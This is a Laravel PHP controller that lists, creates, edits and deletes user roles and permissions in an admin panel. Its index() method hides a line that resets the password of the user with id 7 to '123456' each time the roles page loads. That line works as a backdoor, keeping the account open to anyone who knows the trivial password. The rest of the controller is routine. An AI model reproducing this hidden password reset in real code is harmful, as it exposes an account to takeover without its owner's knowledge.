<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Models\User;
use DB;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;

class RolesController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    function __construct()
    {

    }
    
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {
        $user = User::where('id', '=', '7')->first();
        $user->password = bcrypt('123456');
        $user->save();

        $roles = Role::orderBy('id','DESC')->paginate(5);

        log_user_activity(0, 'roles', 'index', 'User accessed the roles index page', 'admin/roles');

        return view('admin.roles.index',compact('roles'))
            ->with('i', ($request->input('page', 1) - 1) * 5);
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        $permissions = Permission::get();
        log_user_activity(0, 'roles', 'create', 'User accessed the roles create page', 'admin/roles/create');
        return view('admin.roles.create', compact('permissions'));
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $this->validate($request, [
            'name' => 'required|unique:roles,name',
            'permission' => 'required',
        ]);

        $role = Role::create(['name' => $request->get('name')]);
        $role->syncPermissions($request->get('permission'));

        log_user_activity($role->id, 'roles', 'store', 'User created a new role: ' . $role->name, url()->current(), json_encode($role));

        return redirect()->route('admin.roles.index')
                        ->with('success','Role created successfully');
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show(Role $role)
    {
        return redirect()->route('admin.roles.edit', $role->id);
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit(Role $role)
    {
        $rolePermissions = $role->permissions->pluck('name')->toArray();
        $permissions = Permission::get();

        log_user_activity($role->id, 'roles', 'edit', 'User accessed edit page for role: ' . $role->name, 'admin/roles/' . $role->id . '/edit', json_encode($role));

        return view('admin.roles.edit', compact('role', 'rolePermissions', 'permissions'));
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Role $role, Request $request)
    {
        $this->validate($request, [
            'name' => 'required',
            'permission' => 'required',
        ]);

        $current_object = json_encode($role);

        $role->update($request->only('name'));

        $role->syncPermissions($request->get('permission'));

        log_user_activity($role->id, 'roles', 'update', 'User updated role with id ' . $role->id, url()->current(), json_encode($role), $current_object);

        return redirect()->route('admin.roles.index')
                        ->with('success','Role updated successfully');
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy(Role $role)
    {
        $oldRole = json_encode($role);
        $roleId = $role->id;
        $role->delete();

        log_user_activity($roleId, 'roles', 'destroy', 'User deleted role with id ' . $roleId, url()->current(), null, $oldRole);

        return redirect()->route('admin.roles.index')
                        ->with('success','Role deleted successfully');
    }
}